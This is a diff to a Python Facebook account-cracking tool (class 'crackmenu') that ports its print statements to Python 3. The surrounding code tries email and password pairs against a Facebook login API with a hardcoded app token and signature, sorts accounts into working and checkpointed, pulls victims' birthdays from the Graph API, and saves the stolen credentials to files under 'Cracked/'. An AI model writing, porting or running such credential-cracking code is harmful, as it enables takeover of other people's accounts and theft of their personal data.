@@ -679,7 +679,7 @@ class crackmenu:
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             response = requests.get(api, params=params, headers=headers_)
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r%s[Al3X-OK]: %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s' % (H, user, pw, N)
+                print("\r%s[Al3X-OK] %s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s                 %s" % (H, user, pw, N))
                 wrt = '%s | %s ' % (user, pw)
                 ok.append(wrt)
                 open('Cracked/okz.txt', 'a').write('%s\n' % wrt)
@@ -691,7 +691,7 @@ class crackmenu:
                     ak = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, loginz))
                     az = json.loads(ak.text)
                     dob = az['birthday'].replace('/', '-')
-                    print '\r%s[AL3X-CP] \033[1;31m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s' % (K, user, pw, dob, N)
+                    print("\r%s[AL3X-CP] \033[1;31m%s \xe2\x9e\xa4 %s \xe2\x9e\xa4 %s      %s" % (K, user, pw, dob, N))
                     wrt = '%s | %s | %s' % (user, pw, dob)
                     cp.append(wrt)
                     open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
@@ -700,8 +700,7 @@ class crackmenu:
                     dob = ''
                 except:
                     pass
-
-                print '\r%s[AL3X-CP]\033[1;31m %s \xe2\x9e\xa4 %s                 %s' % (K, user, pw, N)
+                print("\r%s[AL3X-CP]\033[1;31m %s \xe2\x9e\xa4 %s                 %s" % (K, user, pw, N))
                 wrt = '%s | %s ' % (user, pw)
                 cp.append(wrt)
                 open('Cracked/cpz.txt', 'a').write('%s\n' % wrt)
